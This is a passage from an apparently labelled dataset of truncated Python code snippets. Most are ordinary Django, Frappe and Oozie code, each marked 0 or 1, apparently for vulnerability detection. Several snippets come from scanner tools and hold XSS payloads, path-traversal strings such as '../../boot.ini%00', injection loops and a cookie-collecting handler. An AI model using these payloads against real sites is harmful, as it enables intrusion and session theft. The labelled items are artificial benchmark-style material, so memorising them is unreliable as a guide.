self.name", "label": 0}, {"snippet_id": 12050, "code": "'^calculate$', 'util.views.calculate'), url(r'^courses/?$', 'branding.views.courses', name=\"courses\"), url(r'^change_enrollment$', 'student.views.change_enrollment', name=\"change_enrollment\"), url(r'^courses/", "label": 0}, {"snippet_id": 13760, "code": "/]*)/(?P<page>[^/]*)$', 'staticbook.views.pdf_index', name=\"pdf_book\"), url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/htmlbook/(?P<book_index>[^/]*)/$', 'staticbook.views.html_index', name=\"html_book", "label": 1}, {"snippet_id": 18810, "code": "): urlpatterns +=( url(r'^openid/login/$', 'django_openid_auth.views.login_begin', name='openid-login'), url(r'^openid/complete/$', 'external_auth.views.openid_login_complete', name='openid-complete'),", "label": 0}, {"snippet_id": 39934, "code": ", options): \t\t\t\tcontinue \t\t\t \t\t\tself.set(df.fieldname, cstr(self.get(df.fieldname)).strip()) \t\t\tvalue=self.get(df.fieldname) \t\t\tif value not in options and not(frappe.flags.in_test and value.startswith", "label": 0}, {"snippet_id": 460, "code": " logs.logging.info(\"%s is vulnerable to XSS\",url) if xss_request_url.text.find(payload) !=-1 or xss_request_uri.text.find(payload) !=-1: impact=check_xss_impact(xss_request_url.headers) print \"%s[{0}]{1", "label": 1}, {"snippet_id": 55018, "code": " translation=t, project=project, ) for t in( Translation.objects .filter(pk__in=changed_translation_pks) .prefetch_related('entity__resource') ) ] TranslationMemoryEntry.objects.bulk_create(memory_entries)", "label": 0}, {"snippet_id": 38228, "code": "\t`tabBlog Post` where ifnull(published,0)=1\"\"\"): \t\tclear_cache(blog) \tclear_cache(\"writers\") def get_blog_category(route): \treturn frappe.db.get_value(\"Blog Category\",{\"name\": route}, \"title\") or route", "label": 0}, {"snippet_id": 31459, "code": "=source, alpha=0.5, color=\" \t\tp[serv].line(\"Date\", \"sess_rate\", source=source, alpha=0.5, color=\" \t\tp[serv].legend.orientation=\"horizontal\" \t\tp[serv].legend.location=\"top_left\" \t\tp[serv].legend.padding", "label": 0}, {"snippet_id": 46586, "code": "] for collection in collections]) } return JsonResponse(response) def admin_collection_copy(request): if request.method !='POST': raise PopupException(_('POST request required.')) collections=json.loads", "label": 0}, {"snippet_id": 48853, "code": " return self.field_name.replace(\"_\", \" \").title() class QueryParamsMixin(object): def get_url_with_query_params(self, new_query_dict): query=dict(self.query_params).copy() for key, value in query.items(", "label": 0}, {"snippet_id": 28734, "code": "*kwargs): \tgive_level=1 \tgive_level=kwargs.get(\"level\") \t\t \tif not is_admin(level=give_level): \t\tprint('<center><h3 style=\"color: red\">How did you get here?! O_o You do not have need permissions</h>') \t", "label": 1}, {"snippet_id": 17694, "code": "', 'student.views.login_user'), url(r'^logout$', 'student.views.logout_user', name='logout'), url(r'^create_account$', 'student.views.create_account', name='create_account'), url(r'^activate/(?P<key>[^", "label": 0}, {"snippet_id": 32725, "code": "') except: raise def _DoRawSourceFile(self, full_path): self._WriteHeader('text/html') self._WriteTemplate('header.html') self.wfile.write('<table class=\"FileContents\">') with open(full_path) as fp: data", "label": 0}, {"snippet_id": 38808, "code": ": \t\tif key in self.__dict__: \t\t\tdel self.__dict__[key] \tdef append(self, key, value=None): \t\tif value==None: \t\t\tvalue={} \t\tif isinstance(value,(dict, BaseDocument)): \t\t\tif not self.__dict__.get(key): \t", "label": 0}, {"snippet_id": 28081, "code": ": \"\"\"Log out handler.\"\"\" @handler.unsupported_on_local_server @handler.require_csrf_token @handler.get(handler.HTML) def get(self): \"\"\"Handle a get request.\"\"\" try: auth.revoke_session_cookie(auth.get_session_cookie", "label": 0}, {"snippet_id": 21832, "code": "', include(admin.site.urls)),) if settings.MITX_FEATURES.get('AUTH_USE_OPENID'): urlpatterns +=( url(r'^openid/login/$', 'django_openid_auth.views.login_begin', name='openid-login'), url(r'^openid/complete", "label": 0}, {"snippet_id": 43427, "code": "\") \t\t\t\t\t\tor df.get(\"fieldtype\") in(\"Attach\", \"Attach Image\") \t\t\t\t\t\t \t\t\t\t\t\tor self.docstatus==2 \t\t\t\t\t\tor(self.docstatus==1 and not df.get(\"allow_on_submit\"))): \t\t\t\tcontinue \t\t\telse: \t\t\t\tsanitized_value=sanitize_html", "label": 1}, {"snippet_id": 38326, "code": " `tabCommunication` \t\t\t\t\twhere \t\t\t\t\t\tcommunication_type='Comment' \t\t\t\t\t\tand comment_type='Comment' \t\t\t\t\t\tand reference_doctype='Blog Post' \t\t\t\t\t\tand reference_name=t1.name) as comments \t\tfrom `tabBlog Post` t1", "label": 0}, {"snippet_id": 96, "code": "(\"GET param for xss: %s\",key) xss_payloads=fetch_xss_payload() for payload in xss_payloads: if result is not True: xss_url=url.replace(value[0], payload) xss_request=req.api_request(xss_url,\"GET\",headers", "label": 1}, {"snippet_id": 17000, "code": "?P<course_id>[^/]+/[^/]+/[^/]+)/staff_grading/get_problem_list$', 'open_ended_grading.staff_grading_service.get_problem_list', name='staff_grading_get_problem_list'), url(r'^courses/(?P<course_id>[^/]+", "label": 0}, {"snippet_id": 2977, "code": "\"res_body\": xss_request.text} dbupdate.insert_record(attack_result) result,db_update=True,True vul_param +=key else: result=True if vul_param=='': vul_param +=key else: vul_param +=','+key except: logs", "label": 0}, {"snippet_id": 18288, "code": " url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/pdfbook/(?P<book_index>[^/]*)/chapter/(?P<chapter>[^/]*)/$', 'staticbook.views.pdf_index', name=\"pdf_book\"), url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]", "label": 1}, {"snippet_id": 32834, "code": "<html><body>%s not found</body></html>' % self.path) def _DoUnknown(self): self._WriteHeader('text/html', status_code=501) self.wfile.write('<html><body>I do not know how to serve %s.</body>' '</html>'", "label": 0}, {"snippet_id": 43308, "code": " \t\t\t\t\tdb_value=len(db_value) \t\t\t\telse: \t\t\t\t\tself_value=self.get_value(key) \t\t\t\tif self_value !=db_value: \t\t\t\t\tfrappe.throw(_(\"Not allowed to change{0} after submission\").format(df.label), \t\t\t\t\t\tfrappe.UpdateAfterSubmitError", "label": 0}, {"snippet_id": 24112, "code": " functionality is inherited from BokChoyTestSuite, so those tests aren't duplicated. \"\"\" def setUp(self): super(TestPaverPa11yCrawlerCmd, self).setUp() mock_sh=patch('pavelib.utils.test.suites.bokchoy_suite", "label": 0}, {"snippet_id": 10895, "code": " except FixtureError: pass if self.serversonly: self.run_servers_continuously() def __exit__(self, exc_type, exc_value, traceback): super(BokChoyTestSuite, self).__exit__(exc_type, exc_value, traceback) if", "label": 0}, {"snippet_id": 34836, "code": "=valid \t\treturn frappe.local.valid_columns[self.doctype] \tdef is_new(self): \t\treturn self.get(\"__islocal\") \tdef as_dict(self, no_nulls=False, no_default_fields=False, convert_dates_to_str=False): \t\tdoc=self", "label": 0}, {"snippet_id": 23789, "code": "=name)) def test_suite_spec(self): spec='test_foo.py' suite=BokChoyTestSuite('', test_spec=spec) name='tests/{}'.format(spec) self.assertEqual(suite.cmd, self._expected_command(name=name)) def test_class_spec", "label": 0}, {"snippet_id": 44306, "code": "=None workflow=Workflow() workflow.set_workspace(request.user) workflow.check_workspace(request.fs, request.user) workflow_data=workflow.get_data() api=get_oozie(request.user) credentials=Credentials()", "label": 0}, {"snippet_id": 43195, "code": "\t\t \t\t\t\tcontinue \t\t\tcolumn_type=type_map[df.fieldtype][0] or None \t\t\tdefault_column_max_length=type_map[df.fieldtype][1] or None \t\t\tif df and df.fieldtype in type_map and column_type in column_types_to_check_length", "label": 0}, {"snippet_id": 39477, "code": "\t \t\tif \"unique_\" in fieldname: \t\t\tfieldname=fieldname.split(\"_\", 1)[1] \t\tdf=self.meta.get_field(fieldname) \t\tif df: \t\t\tlabel=df.label \t\tfrappe.msgprint(_(\"{0} must be unique\".format(label or fieldname)", "label": 0}, {"snippet_id": 11928, "code": ".views.end_profile'),) if settings.WIKI_ENABLED: from wiki.urls import get_pattern as wiki_pattern from django_notify.urls import get_pattern as notify_pattern urlpatterns +=( url('^wiki/create-root/$'", "label": 0}, {"snippet_id": 11169, "code": " try: sleep(10000) except KeyboardInterrupt: print \"Stopping bok-choy servers.\\n\" break @property def cmd(self): \"\"\" This method composes the nosetests command to send to the terminal. If nosetests aren", "label": 0}, {"snippet_id": 16070, "code": ", url(r'^dashboard$', 'student.views.dashboard', name=\"dashboard\"), url(r'^login$', 'student.views.signin_user', name=\"signin_user\"), url(r'^register$', 'student.views.register_user', name=\"register_user", "label": 0}, {"snippet_id": 26737, "code": "%2f%2e%2e%2fboot%2eini', '%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2fboot%2eini', '../../boot.ini%00', '../../../boot.ini%00', '../../../../boot.ini%00', '../../../../../boot", "label": 0}, {"snippet_id": 14328, "code": " settings.MITX_FEATURES.get('AUTH_USE_OPENID_PROVIDER'): urlpatterns +=( url(r'^openid/provider/login/$', 'external_auth.views.provider_login', name='openid-provider-login'), url(r'^openid/provider/login/(?:", "label": 0}, {"snippet_id": 44876, "code": " try: workflow=Workflow(document=Document2.objects.get(type='oozie-workflow2', uuid=request.GET.get('uuid'))) response['status']=0 response['parameters']=workflow.find_all_parameters(with_lib_path=False", "label": 0}, {"snippet_id": 17153, "code": "+)/peer_grading$', 'open_ended_grading.views.peer_grading', name='peer_grading'), url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/notes$', 'notes.views.notes', name='notes'), url(r'^courses/(?P<course_id", "label": 0}, {"snippet_id": 16391, "code": "\"media-kit\"), url(r'^faq$', 'static_template_view.views.render', {'template': 'faq.html'}, name=\"faq_edx\"), url(r'^help$', 'static_template_view.views.render', {'template': 'help.html'}, name=\"help_edx", "label": 0}, {"snippet_id": 49990, "code": " django.conf import settings from evennia.utils.ansi import parse_ansi from evennia.utils import utils from evennia.utils.text2html import parse_html from evennia.server import session _CLIENT_SESSIONS", "label": 0}, {"snippet_id": 34277, "code": "._meta=frappe.get_meta(self.doctype) \t\treturn self._meta \tdef update(self, d): \t\tif \"doctype\" in d: \t\t\tself.set(\"doctype\", d.get(\"doctype\")) \t\t \t\tfor key in default_fields: \t\t\tif key in d: \t\t\t\tself.set", "label": 0}, {"snippet_id": 9950, "code": " urlpatterns +=( url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/hint_manager$', 'instructor.hint_manager.hint_manager', name=\"hint_manager\"), ) urlpatterns=patterns(*urlpatterns) if settings.DEBUG: urlpatterns ", "label": 0}, {"snippet_id": 7533, "code": ".views.mktg_course_about', name=\"mktg_about_course\"), url(r'^mktg/(?P<course_id>.*)$', 'courseware.views.mktg_course_about', name=\"mktg_about_course\"), url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/$", "label": 0}, {"snippet_id": 15047, "code": "' '--pa11ycrawler-deny-url-matcher=logout ' '--pa11y-reporter=\"1.0-json\" ' '--depth-limit=6 ' ).format( start_urls=' '.join(start_urls), report_dir=report_dir, ) return expected_statement def test_default", "label": 0}, {"snippet_id": 44564, "code": "'name'], uuid=workflow['uuid'], type='oozie-workflow2', owner=request.user) Document.objects.link(workflow_doc, owner=workflow_doc.owner, name=workflow_doc.name, description=workflow_doc.description, extra", "label": 0}, {"snippet_id": 1579, "code": " jsonify(msg) @app.route('/scan/scanids/', methods=['GET']) def fetch_scanids(): scanids=[] records=db.scanids.find({}) if records: for data in records: data.pop('_id') try: data= ast.literal_eval(json", "label": 0}, {"snippet_id": 38502, "code": "\t\"\"\"Returns the **class** object of the given DocType. \tFor `custom` type, returns `frappe.model.document.Document`. \t:param doctype: DocType name as string.\"\"\" \tfrom frappe.model.document import Document", "label": 0}, {"snippet_id": 21706, "code": "(?P<course_id>[^/]+/[^/]+/[^/]+)/peer_grading$', 'open_ended_grading.views.peer_grading', name='peer_grading'), url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/notes$', 'notes.views.notes', name='notes", "label": 0}, {"snippet_id": 24204, "code": ".get_test_course() self._mock_sh.assert_has_calls([ call( 'wget{targz} -O{dir}demo_course.tar.gz'.format(targz=suite.tar_gz_file, dir=suite.imports_dir)), call( 'tar zxf{dir}demo_course.tar.gz -C{dir}'.format(dir", "label": 0}, {"snippet_id": 28354, "code": " \t\tconfig.read(path_config) \texcept: \t\tprint('Content-type: text/html\\n') \t\tprint('<center><div class=\"alert alert-danger\">Check the config file, whether it exists and the path. Must be: app/haproxy-webintarface", "label": 0}, {"snippet_id": 840, "code": ".db import Database_update from utils.config import get_value dbupdate=Database_update() api_logger=logger() def fetch_xss_payload(): payload_list=[] if os.getcwd().split('/')[-1]=='API': path='../Payloads", "label": 0}, {"snippet_id": 47412, "code": "' '&payload=' +str(user_id) +'\"><img class=\"button-img\" alt=\"Change avatar\" ' 'src=\"/staticfiles/frontpage/change-avatar.png\"/></a><br />')) else: f.add_content(PlainText('<h3>Add new user</h3>')) if not", "label": 0}, {"snippet_id": 30883, "code": "(cmd) \ttemplate=template.render(stdout=output)\t \t \tprint(template) \tprint(stderr) \t if serv is not None and act==\"configShow\": \thap_configs_dir=funct.get_config_var('configs', 'haproxy_save_configs_dir')", "label": 0}, {"snippet_id": 45029, "code": "'params_form': params_form, 'action': reverse('oozie:editor_submit_workflow', kwargs={'doc_id': workflow.id}) }, force_template=True).content return HttpResponse(json.dumps(popup), mimetype=\"application/json\")", "label": 0}, {"snippet_id": 54910, "code": " pontoon.batch import forms from pontoon.batch.actions import ACTIONS_FN_MAP log=logging.getLogger(__name__) def update_stats(translated_resources, locale): \"\"\"Update stats on a list of TranslatedResource", "label": 0}, {"snippet_id": 19809, "code": "-modulestore to use when running tests(split or draft) num_processes -number of processes or threads to use in tests. Recommendation is that this is less than or equal to the number of available processors", "label": 0}, {"snippet_id": 20279, "code": " Just press it once.\\n' while True: try: sleep(10000) except KeyboardInterrupt: print \"Stopping bok-choy servers.\\n\" break @property def cmd(self): \"\"\" This method composes the nosetests command to send", "label": 0}, {"snippet_id": 37208, "code": ".website.website_generator import WebsiteGenerator from frappe.website.render import clear_cache from frappe.utils import today, cint, global_date_format, get_fullname, strip_html_tags, markdown from frappe", "label": 1}, {"snippet_id": 27659, "code": "(self, path, values=None, status=200): \"\"\"Write HTML response.\"\"\" if values is None: values={} values['menu_items']=_MENU_ITEMS values['is_oss_fuzz']=utils.is_oss_fuzz() values['is_development']=( environment", "label": 0}, {"snippet_id": 42935, "code": " frappe.get_meta(doctype).issingle: \t\t\t\t\tvalues.name=doctype \t\t\t\tif values: \t\t\t\t\tsetattr(self, df.fieldname, values.name) \t\t\t\t\tfor _df in fields_to_fetch: \t\t\t\t\t\tif self.is_new() or self.docstatus !=1 or _df", "label": 0}, {"snippet_id": 17402, "code": "/xrds/$', 'external_auth.views.provider_xrds', name='openid-provider-xrds') ) if settings.MITX_FEATURES.get('ENABLE_PEARSON_LOGIN', False): urlpatterns +=url(r'^testcenter/login$', 'external_auth.views", "label": 0}, {"snippet_id": 27098, "code": "[+] Start scan\" rtype=\"\" has_form=0 params=[] hidden_param_name=[] hidden_param_value=[] page=\"\" form_counter=0 try: with open(fname, \"r\") as f: for line in f: if line.find(\"</form>\") >=0: has_form=0 if", "label": 1}, {"snippet_id": 42785, "code": "\t\treturn missing \tdef get_invalid_links(self, is_submittable=False): \t\t'''Returns list of invalid links and also updates fetch values if not set''' \t\tdef get_msg(df, docname): \t\t\tif self.parentfield: \t", "label": 0}, {"snippet_id": 2250, "code": "(url) parsed_query=urlparse.parse_qs(url_query.query) if parsed_query: for key,value in parsed_query.items(): try: result='' logs.logging.info(\"GET param for xss: %s\",key) xss_payloads=fetch_xss_payload()", "label": 0}, {"snippet_id": 16264, "code": " +=( url(r'^(?i)university_profile/WellesleyX$', 'courseware.views.static_university_profile', name=\"static_university_profile\", kwargs={'org_id': 'WellesleyX'}), url(r'^(?i)university_profile/McGillX$", "label": 0}, {"snippet_id": 17684, "code": ", 'student.views.login_user', name=\"login\"), url(r'^login_ajax/(?P<error>[^/]*)$', 'student.views.login_user'), url(r'^logout$', 'student.views.logout_user', name='logout'), url(r'^create_account$', 'student", "label": 0}, {"snippet_id": 42086, "code": "]=1 \t\treturn value \tdef get_valid_dict(self, sanitize=True, convert_dates_to_str=False): \t\td=frappe._dict() \t\tfor fieldname in self.meta.get_valid_columns(): \t\t\td[fieldname]=self.get(fieldname) \t\t\t \t\t\tif", "label": 0}, {"snippet_id": 51708, "code": "/dashboard/static/' JET_SIDE_MENU_ITEMS=[ {'label': _('\ud83d\udd27 Configuration'), 'items':[ {'name': 'auth.user'}, {'name': 'auth.group'}, {'name': 'constance.config', 'label': _('Configuration')}, ]}, {'label", "label": 1}, {"snippet_id": 19059, "code": "', 'debug.views.run_python'), ) if settings.MITX_FEATURES.get('ENABLE_HINTER_INSTRUCTOR_VIEW'): urlpatterns +=( url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/hint_manager$', 'instructor.hint_manager.hint_manager", "label": 0}, {"snippet_id": 27849, "code": "(exception.message) else: self.render('error.html', values, status) except Exception: self.handle_exception_exception() def handle_exception_exception(self): \"\"\"Catch exception in handle_exception and format it", "label": 0}, {"snippet_id": 35872, "code": ").format(df.label), \t\t\t\t\t\tfrappe.UpdateAfterSubmitError) \tdef _sanitize_content(self): \t\t\"\"\"Sanitize HTML and Email in field values. Used to prevent XSS. \t\t\t-Ignore if 'Ignore XSS Filter' is checked or", "label": 0}, {"snippet_id": 30457, "code": "[ \"sudo cat %s| awk '$3>\\\"%s:00\\\" && $3<\\\"%s:00\\\"' |tail -%s %s %s\" %(local_path_logs, date, date1, rows, grep_act, grep)]\t\t \telse: \t\tcommands=[ \"sudo cat /var/log/%s/syslog.log | sed '/ %s:00/,/ %s:00", "label": 0}, {"snippet_id": 38193, "code": " name, \t\ttitle from `tabBlog Category` \t\twhere published=1 \t\tand exists(select name from `tabBlog Post` \t\t\twhere `tabBlog Post`.blog_category=`tabBlog Category`.name and published=1) \t\torder by title asc", "label": 0}, {"snippet_id": 53678, "code": " submission=Submission(request.user, bundle, request.fs, request.jt, properties=properties) job_id=submission.run() return job_id except RestException, ex: raise PopupException(_(\"Error submitting bundle ", "label": 0}, {"snippet_id": 49520, "code": ", ForeignKey): pks=self.object_list.order_by().distinct().values_list('%s__pk' % self.field_name, flat=True) remote_field=self.model_field.rel if hasattr(self.model_field, 'rel') else self.model_field.remote_field", "label": 0}, {"snippet_id": 2558, "code": "\"req_headers\": headers, \"req_body\":body, \"res_headers\": xss_request.headers,\"res_body\": xss_request.text} dbupdate.insert_record(attack_result) db_update=True vul_param +=key else: result=True if vul_param=", "label": 0}, {"snippet_id": 14438, "code": "'^event_logs$', 'track.views.view_tracking_log'), url(r'^event_logs/(?P<args>.+)$', 'track.views.view_tracking_log'), ) if settings.MITX_FEATURES.get('ENABLE_SERVICE_STATUS'): urlpatterns +=( url(r'^status/", "label": 0}, {"snippet_id": 14425, "code": "'^gitreload/(?P<reload_dir>[^/]+)$', 'lms_migration.migrate.gitreload'), ) if settings.MITX_FEATURES.get('ENABLE_SQL_TRACKING_LOGS'): urlpatterns +=( url(r'^event_logs$', 'track.views.view_tracking_log'),", "label": 0}, {"snippet_id": 13471, "code": " from django_notify.urls import get_pattern as notify_pattern urlpatterns +=( url('^wiki/create-root/$', 'course_wiki.views.root_create', name='root_create'), url(r'^wiki/', include(wiki_pattern())), url", "label": 0}, {"snippet_id": 35576, "code": " and df.options): \t\t\t\tcontinue \t\t\toptions=(df.options or \"\").split(\"\\n\") \t\t\t \t\t\tif not filter(None, options): \t\t\t\tcontinue \t\t\t \t\t\tself.set(df.fieldname, cstr(self.get(df.fieldname)).strip()) \t\t\tvalue=self", "label": 0}, {"snippet_id": 5631, "code": "/src=` onerror=confirm``> --!>', '\\'\"</Script><Html Onmouseover=(confirm)()//' '<imG/sRc=l oNerrOr=(prompt)() x>', '<!--<iMg sRc=--><img src=x oNERror=(prompt)`` x>', '<deTails open oNToggle=confi\\u0072m", "label": 0}, {"snippet_id": 53838, "code": "+\"&page=\" +str(page)) parser=BeautifulSoup(send.data, features=\"lxml\") for link in parser.find_all('cite'): result=link.string x=str(input(\"[Input Script] >_ \")) print(str(result) +\"'\" +\"<marquee style", "label": 1}, {"snippet_id": 37786, "code": "\t\telif post.comments==1: \t\t\tpost.comment_text=_('1 comment') \t\telse: \t\t\tpost.comment_text=_('{0} comments').format(str(post.comments)) \t\tpost.avatar=post.avatar or \"\" \t\tpost.category=frappe.db.get_value", "label": 0}, {"snippet_id": 1736, "code": "': vul['remediation'] } vul_list.append(all_data) break except: pass print vul_list return vul_list @app.route('/alerts/<scanid>', methods=['GET']) def return_alerts(scanid): print \"ScanID is \",scanid result", "label": 0}, {"snippet_id": 35045, "code": ".show_unique_validation_message(e) \t\t\t\telse: \t\t\t\t\traise \t\t\telse: \t\t\t\traise \t\tself.set(\"__islocal\", False) \tdef db_update(self): \t\tif self.get(\"__islocal\") or not self.name: \t\t\tself.db_insert() \t\t\treturn", "label": 0}, {"snippet_id": 23273, "code": "?P<marg>.*)$', 'courseware.masquerade.handle_ajax', name=\"masquerade-switch\"), ) if settings.MITX_FEATURES.get('ENABLE_DISCUSSION_SERVICE'): urlpatterns +=( url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/", "label": 0}, {"snippet_id": 28784, "code": "\t \tfor sshs in sql.select_ssh(serv=serv): \t\tssh_enable=sshs[3] \t\tssh_user_name=sshs[4] \t\tssh_user_password=sshs[5] \t\tssh_key_name=fullpath+'/keys/%s.pem' % sshs[2] \tservers=sql.select_servers(server=serv", "label": 0}, {"snippet_id": 49991, "code": " django.conf import settings from evennia.utils.ansi import parse_ansi from evennia.utils import utils from evennia.utils.text2html import parse_html from evennia.server import session _CLIENT_SESSIONS=utils", "label": 0}, {"snippet_id": 39553, "code": ".fieldtype==\"Int\": \t\t\t\t\tself.set(df.fieldname, cint(self.get(df.fieldname))) \t\t\t\telif df.fieldtype in(\"Float\", \"Currency\", \"Percent\"): \t\t\t\t\tself.set(df.fieldname, flt(self.get(df.fieldname))) \t\tif self", "label": 0}, {"snippet_id": 8941, "code": "]+)/course_wiki/?$', 'course_wiki.views.course_wiki_redirect', name=\"course_wiki\"), url(r'^courses/(?:[^/]+/[^/]+/[^/]+)/wiki/', include(wiki_pattern())), ) if settings.COURSEWARE_ENABLED: urlpatterns ", "label": 0}, {"snippet_id": 39105, "code": ".datetime, datetime.time, datetime.timedelta)): \t\t\t\t\td[fieldname]=str(d[fieldname]) \t\treturn d \tdef init_valid_columns(self): \t\tfor key in default_fields: \t\t\tif key not in self.__dict__: \t\t\t\tself.__dict__[key]", "label": 0}, {"snippet_id": 46935, "code": " return obj async def del_comment(self, user_id, comment_id): c=await Comment.get(id=comment_id) if c and c.github_id==user_id and c.post_id==self.id: await c.delete() return True return False @property", "label": 0}, {"snippet_id": 21660, "code": " name=\"add_to_cohort\"), url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/cohorts/(?P<cohort_id>[0-9]+)/delete$', 'course_groups.views.remove_user_from_cohort', name=\"remove_from_cohort\"), url(r'^courses", "label": 0}, {"snippet_id": 39054, "code": "[fieldname], float): \t\t\t\t\td[fieldname]=flt(d[fieldname]) \t\t\t\telif df.fieldtype in(\"Datetime\", \"Date\", \"Time\") and d[fieldname]==\"\": \t\t\t\t\td[fieldname]=None \t\t\t\telif df.get(\"unique\") and cstr(d[fieldname", "label": 0}, {"snippet_id": 29918, "code": ">Can not connect to the server</div>') \t\t if form.getvalue('ssh_cert'): \tname=form.getvalue('name') \t \tif not os.path.exists(os.getcwd()+'/keys/'): \t\tos.makedirs(os.getcwd()+'/keys/') \t \tssh_keys=os.path", "label": 0}, {"snippet_id": 54035, "code": ".Thread): def run(self): global stop ti=time.time() print(\"=\"*25) print(\"\\n[*]Target:{}\\n[*]Date:{}\".format(target.get(),datetime.now().strftime(\"%d/%m/%Y %H:%M:%S\"))) crl=[target.get()] if crawl.get()=='On", "label": 0}, {"snippet_id": 51120, "code": " naturaltime(date) @staticmethod def precise(obj): if obj.last_run_at: return obj.schedule.remaining_estimate(last_run_at=obj.last_run_at) else: return obj.schedule.remaining_estimate(last_run_at=datetime.now", "label": 0}, {"snippet_id": 44654, "code": "(request.POST.get('node', '{}')) properties=NODES[node['widgetType']].get_mandatory_fields() workflows=[] if node['widgetType']=='subworkflow-widget': workflows=_get_workflows(request.user) response['status'", "label": 0}, {"snippet_id": 10974, "code": " \"--with-xunitmp --xunitmp-file={}\".format(self.xunit_report), \"--processes={}\".format(self.num_processes), \"--no-color --process-timeout=1200\" ] else: substring=[ \"--with-xunit\", \"--xunit-file={}\".format", "label": 0}, {"snippet_id": 30921, "code": "=hap_configs_dir +form.getvalue('configver') \t\t\t \ttry: \t\tconf=open(cfg, \"r\") \texcept IOError: \t\tprint('<div class=\"alert alert-danger\">Can\\'t read import config file</div>') \t\t \tfrom jinja2 import Environment,", "label": 0}, {"snippet_id": 8742, "code": "': 'ANUx'}), url(r'^(?i)university_profile/EPFLx$', 'courseware.views.static_university_profile', name=\"static_university_profile\", kwargs={'org_id': 'EPFLx'}), url(r'^university_profile/(?P<org_id>[^/", "label": 0}, {"snippet_id": 28121, "code": "-type: text/html\\n') funct.check_login() form=cgi.FieldStorage() serv=form.getvalue('serv') config_read=\"\" cfg=\"\" stderr=\"\" error=\"\" aftersave=\"\" try: \tcookie=http.cookies.SimpleCookie(os.environ.get(\"HTTP_COOKIE", "label": 0}, {"snippet_id": 52125, "code": "=Credentials() try: credentials.fetch(api) except Exception, e: LOG.error(smart_str(e)) return render('editor/workflow_editor.mako', request,{ 'layout_json': json.dumps(workflow_data['layout']), 'workflow_json", "label": 1}, {"snippet_id": 26351, "code": " the VAT checking service of ' 'your country is currently not available. We will therefore ' 'need to charge VAT on your invoice. You can get the tax amount ' 'back via the VAT reimbursement process.')", "label": 0}, {"snippet_id": 50849, "code": ": args[0]=parse_html(text, strip_ansi=nocolor) self.client.lineSend(self.csessid,[cmd, args, kwargs]) def send_prompt(self, *args, **kwargs): kwargs[\"options\"].update({\"send_prompt\": True}) self.send_text", "label": 0}, {"snippet_id": 5824, "code": "=_events htmlTemplate=_htmlTemplate probes=_probes payloads=_payloads waf_payloads=_waf_payloads h5payloads=_h5payloads def __init__(self, url=\"\"): \"\"\" url: xss payload url \"\"\" super(XSS, self).__init__(", "label": 0}, {"snippet_id": 22732, "code": "-about$', 'courseware.views.mktg_course_about', name=\"mktg_about_course\"), url(r'^mktg/(?P<course_id>.*)$', 'courseware.views.mktg_course_about', name=\"mktg_about_course\"), url(r'^courses/(?P<course_id>[^", "label": 0}, {"snippet_id": 44326, "code": "=Credentials() try: credentials.fetch(api) except Exception, e: LOG.error(smart_str(e)) return render('editor/workflow_editor.mako', request,{ 'layout_json': json.dumps(workflow_data['layout']), 'workflow_json", "label": 1}, {"snippet_id": 38352, "code": ")=1 \t\tand t1.blogger=t2.name \t\t%(condition)s \t\torder by published_on desc, name asc \t\tlimit %(start)s, %(page_len)s\"\"\" %{ \t\t\t\"start\": limit_start, \"page_len\": limit_page_length, \t\t\t\t\"condition\":(\" and ", "label": 0}, {"snippet_id": 14788, "code": "', verify_xss=True) name='tests' self.assertEqual(suite.cmd, self._expected_command(name=name, verify_xss=True)) def test_verify_xss_env_var(self): self.env_var_override.set('VERIFY_XSS', 'True') with self", "label": 1}, {"snippet_id": 53107, "code": " doc in dependencies: doc.doc.get().can_read_or_exception(request.user) coordinator_doc.dependencies=dependencies coordinator_doc.update_data(coordinator_data) coordinator_doc.name=coordinator_data['name'", "label": 0}, {"snippet_id": 54002, "code": ",mode='a') as f: \t\t\tf.write('\\n---------------------------\\n'+cookie+'\\n---------------------------\\n') \t\tprint(colored('\\n\\n[+] ','green')+'New Cookie..\\n\\n') \t\treturn 'Thanks:)' if __name__=='__main__'", "label": 0}, {"snippet_id": 18361, "code": "/(?P<course_id>[^/]+/[^/]+/[^/]+)/courseware/?$', 'courseware.views.index', name=\"courseware\"), url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/courseware/(?P<chapter>[^/]*)/$', 'courseware.views.index", "label": 0}, {"snippet_id": 30043, "code": "\texcept IOError: \t\tprint('<div class=\"alert alert-danger\">Can\\'t save ssl keys file. Check ssh keys path in config</div>') \telse: \t\tprint('<div class=\"alert alert-success\">SSL file was upload to %s into: %s", "label": 0}, {"snippet_id": 15184, "code": "): \"\"\" TestSuite for running Bok Choy tests Properties(below is a subset): test_dir -parent directory for tests log_dir -directory for test output report_dir -directory for reports(e.g., coverage) related", "label": 0}, {"snippet_id": 13868, "code": "<course_id>[^/]+/[^/]+/[^/]+)/progress$', 'courseware.views.progress', name=\"progress\"), url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/progress/(?P<student_id>[^/]*)/$', 'courseware.views.progress', name", "label": 0}, {"snippet_id": 2409, "code": " import time import urllib from utils.logger import logger from utils.db import Database_update from utils.config import get_value dbupdate=Database_update() api_logger=logger() def fetch_xss_payload():", "label": 0}, {"snippet_id": 35663, "code": "\":('=',1)})] \t\tif constants: \t\t\tvalues=frappe.db.get_value(self.doctype, self.name, constants, as_dict=True) \t\tfor fieldname in constants: \t\t\tdf=self.meta.get_field(fieldname) \t\t\t \t\t\tif df.fieldtype=='Date", "label": 0}, {"snippet_id": 42982, "code": ".fieldname !=\"amended_from\" \t\t\t\t\t\tand(is_submittable or self.meta.is_submittable) and frappe.get_meta(doctype).is_submittable \t\t\t\t\t\tand cint(frappe.db.get_value(doctype, docname, \"docstatus\"))==2): \t\t\t\t\t", "label": 0}, {"snippet_id": 24552, "code": "'foobar_org', '1117', 'seed_forum', 'seed_foo').install() print 'Forums permissions/roles data has been seeded' 